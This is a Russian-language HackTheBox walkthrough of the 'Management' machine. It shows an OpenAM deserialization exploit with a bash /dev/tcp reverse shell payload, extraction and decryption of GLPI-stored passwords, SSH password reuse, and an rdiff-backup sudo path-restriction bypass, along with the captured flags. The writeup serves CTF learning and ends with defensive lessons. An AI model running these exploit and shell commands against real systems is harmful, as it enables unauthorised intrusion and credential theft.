# Management — HackTheBox Writeup (на русском)

**Платформа:** Hack The Box
**Категория:** Linux / Web Exploitation / Privilege Escalation
**Сложность:** Easy
**Цель:** 10.129.148.128
**Дата:** 2026-10-14

---

## Контекст / Область

Management — Linux-машина уровня Easy на Hack The Box. Цепочка атаки включает эксплуатацию неаутентифицированной уязвимости десериализации Java в OpenAM, использование открытых конфигурационных файлов GLPI для восстановления учётных данных и злоупотребление ошибкой в sudo-правиле `rdiff-backup` для получения root.

---

## Разведка

### Сканирование Nmap

```bash
nmap -Pn -sC -sV -p- --min-rate=1000 -oN nmap_management.txt 10.129.148.128
```

Ключевые находки:

| Порт | Сервис | Детали |
|------|--------|--------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx, редирект на HTTPS |
| 443 | HTTPS | nginx 1.24.0, SSL-сертификат раскрывает `management.htb` и `*.management.htb` |
| 4444 | SSL/LDAP | Внутренний LDAP OpenAM |
| 50389 | LDAP | Анонимная привязка разрешена |

SSL-сертификат раскрывает имя хоста `sso.management.htb` — намёк на SSO-поддомен.

### Настройка хоста

```bash
echo "10.129.148.128 management.htb sso.management.htb" | sudo tee -a /etc/hosts
```

### Перечисление LDAP

```bash
ldapsearch -x -H ldap://10.129.148.128:50389 -s base -b "" namingContexts
```

Возвращает `dc=management,dc=htb` как naming context.

### Веб-перечисление

```bash
curl -sk https://sso.management.htb/openam/ccversion/Version
```

Возвращает информацию о версии OpenAM, подтверждая, что SSO-портал — это OpenAM.

---

## Эксплуатация

### CVE-2026-33439: Pre-Auth RCE в OpenAM

OpenAM содержит уязвимость десериализации до аутентификации в параметре `jato.clientSession`, эксплуатируемую через JATO ViewBean endpoints.

**Настройка окружения:**

```bash
sudo apt update && sudo apt install -y openjdk-21-jdk python3 python3-pip git unzip
cd ~ && git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git
cd CVE-2026-33439
wget https://github.com/OpenIdentityPlatform/OpenAM/releases/download/16.0.5/OpenAM-16.0.5.war
```

**Подготовка JAR-файлов:**

```bash
unzip OpenAM-16.0.5.war -d /tmp/openam_extracted
find /tmp/openam_extracted -name "*.jar" -exec cp {} Jars/ \;
# servlet-api.jar получить из Tomcat или Maven
```

**Слушатель:**

```bash
nc -lvnp 4444
```

**Запуск эксплойта:**

```bash
cd ~/CVE-2026-33439/"02 Exploit"
python3 Exploit_CVE_2026_33439.py --url https://sso.management.htb/openam \
  --command "bash -i >& /dev/tcp/10.10.15.239/4444 0>&1" --jars Jars/
```

Эксплойт проверяет JATO ViewBean endpoints (`/ui/Login`, `/ui/PWResetUserValidation`, `/ui/PWResetQuestion`) и доставляет сериализованную gadget chain (PriorityQueue → TemplatesImpl → TransletClassLoader) для получения reverse shell от имени пользователя приложения OpenAM.

**Стабилизация шелла:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Латеральное перемещение

### Обнаружение конфигурации GLPI

```bash
id
ls -la /home
ls -la /opt
cat /opt/glpi/config/config_db.php
```

Раскрывает учётные данные базы данных: `glpi:8rhu0L6Pw4Y7` для базы `glpidb`.

### Доступ к базе данных

```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT rootdn, rootdn_passwd FROM glpi_authldaps\G"
```

Возвращает зашифрованный пароль сервисной учётной записи LDAP:
```
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

### Расшифровка пароля через GLPIKey

GLPI использует класс `GLPIKey` с общедоступным `glpicrypt.key` для шифрования/расшифровки чувствительных полей базы данных.

```bash
cd /opt/glpi
php -r 'define("GLPI_CONFIG_DIR","/opt/glpi/config"); require "vendor/autoload.php"; echo (new \GLPIKey())->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==")."\n";'
```

**Расшифрованный пароль:** `WpczC40GhTbk`

### SSH-доступ как owen

Повторное использование пароля подтверждено: пароль сервисной учётной записи LDAP подходит для локального пользователя `owen`.

```bash
ssh owen@management.htb
# Пароль: WpczC40GhTbk
```

**User Flag:**

```bash
cat ~/user.txt
# 4575a40cc178a28c281af42da910f782
```

---

## Повышение привилегий

### Перечисление sudo

```bash
sudo -l
```

Вывод:
```
(ALL) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

### Обход ограничения пути в rdiff-backup

Ограничение `--restrict-path /opt/backup` обходится через `--remote-schema`, который позволяет переопределить путь на `/root`.

```bash
rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" /root::/root /tmp/root_backup
```

Плейсхолдер `%s` подставляется как `/root`, позволяя операции чтения получить доступ к `/root` несмотря на intended-ограничение.

**Root Flag:**

```bash
cat /tmp/root_backup/root.txt
# 6de2624c80fadc1d406cb97b69ca9bf1
```

---

## Тупиковые пути

- Первоначальный nmap без `-Pn` может пропустить хост, если ICMP заблокирован.
- Учётные данные Tomcat по умолчанию на порту 8080 (если есть) — не тот путь.
- Доступ к веб-интерфейсу GLPI требует аутентификации, изначально недоступной.

---

## Результат

**user.txt:** `4575a40cc178a28c281af42da910f782`
**root.txt:** `6de2624c80fadc1d406cb97b69ca9bf1`

Полная компрометация машины через:
1. Pre-auth RCE в OpenAM (CVE-2026-33439)
2. Открытые учётные данные GLPI и слабое хранение ключа шифрования
3. Повторное использование пароля между сервисной и локальной учётными записями
4. Ошибка в sudo, позволяющая обойти ограничение пути

---

## Использованные инструменты

- **nmap** — сканирование портов и перечисление сервисов
- **ldapsearch** — перечисление LDAP-каталога
- **CVE-2026-33439 exploit** (TheMalwareGuardian) — RCE в OpenAM
- **netcat** — слушатель для reverse shell
- **mysql** — доступ к базе данных
- **php** — расшифровка пароля GLPI
- **rdiff-backup** — повышение привилегий

---

## Уроки

1. **Pre-auth уязвимости десериализации** в Java-приложениях (OpenAM, Jenkins, WebLogic) остаются критическими векторами атак. Обход защиты `jato.clientSession` демонстрирует, что обходы патчей предыдущих CVE — обычное дело.
2. **Ключи шифрования, хранящиеся рядом с зашифрованными данными**, не обеспечивают безопасности. Общедоступный `glpicrypt.key` в GLPI полностью обнуляет шифрование базы данных.
3. **Повторное использование пароля** между сервисными и локальными учётными записями — повторяющаяся слабость на HTB и в реальных средах.
4. **Sudo-ограничения должны проверяться на полной поверхности аргументов инструмента.** `--restrict-path` в `rdiff-backup` тривиально обходится через `--remote-schema`.

---

## Очистка / Заметки по безопасности

```bash
rm -rf /tmp/root_backup
rm -rf /tmp/openam_extracted
```

Учётные данные и флаги задокументированы только для целей writeup.
